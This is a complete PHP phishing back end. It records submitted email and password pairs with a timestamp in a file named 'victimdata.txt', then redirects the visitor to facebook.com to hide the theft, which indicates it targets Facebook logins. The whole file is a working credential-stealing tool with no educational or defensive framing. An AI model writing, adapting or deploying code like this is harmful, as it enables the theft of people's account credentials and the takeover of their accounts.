<?php
ob_start();
$pwd = getcwd();
$date = date('Y-m-d H:i:s');

if(isset($_POST['email']) && isset($_POST['pass'])){ 

	$email = $_POST['email'] . str_repeat(" ", 24 - strlen($_POST['email']));
	$pass = $_POST['pass']  . str_repeat(" ", 21 - strlen($_POST['pass']));

    $data = '| ' . $email . ' | ' . $pass . ' | ' . $date . " |\n";
    $ret = file_put_contents('victimdata.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
    	$url = 'http://facebook.com'; //define your location you want to redirect
    	header('Location: ' . $url); exit();
    }


}
else {
   die('no post data to process');
}

?>